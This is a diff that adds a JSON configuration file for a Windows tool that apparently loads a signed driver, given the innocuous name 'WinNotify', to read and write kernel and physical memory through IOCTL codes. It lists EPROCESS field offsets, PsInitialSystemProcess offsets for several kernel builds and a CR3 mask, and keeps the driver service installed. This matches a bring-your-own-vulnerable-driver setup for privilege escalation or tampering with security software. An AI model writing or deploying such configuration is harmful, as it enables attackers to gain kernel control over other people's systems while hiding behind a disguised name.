@@ -1,0 +1,33 @@
+{
+  "_comment": "copy to winnotify.json next to the exe to override. strings may use 0x notation.",
+  "ioctl_info": "0x22200C",
+  "ioctl_read": "0x222040",
+  "ioctl_write": "0x222044",
+  "ioctl_phys_read": "0x222050",
+  "ioctl_phys_write": "0x222054",
+  "device_path": "\\\\.\\WinNotify",
+  "service_name": "WinNotify",
+  "driver_search": [
+    "C:\\Windows\\System32\\drivers\\WinNotify.sys",
+    "exe_dir\\WinNotify.sys",
+    "exe_dir\\signeddrv.sys",
+    "C:\\Windows\\System32\\drivers\\signeddrv.sys"
+  ],
+  "info_module_names": ["ntoskrnl.exe", "ntoskrnl"],
+  "info_input_size": 256,
+  "info_output_size": 64,
+  "info_result_offset": "0x10",
+  "read_input_size": 56,
+  "read_bias": "0x10",
+  "read_output_size": 64,
+  "read_result_offset": "0x20",
+  "write_input_size": 24,
+  "phys_header_size": 20,
+  "phys_page_size": "0x1000",
+  "eprocess_links": "0x448",
+  "eprocess_pid": "0x440",
+  "eprocess_dtb": "0x28",
+  "ps_initial_system_offsets": ["0xCFC420", "0xD19420", "0xD0A420", "0xCFC3E0"],
+  "cr3_mask": "0x000FFFFFFFFFF000",
+  "keep_service": true
+}
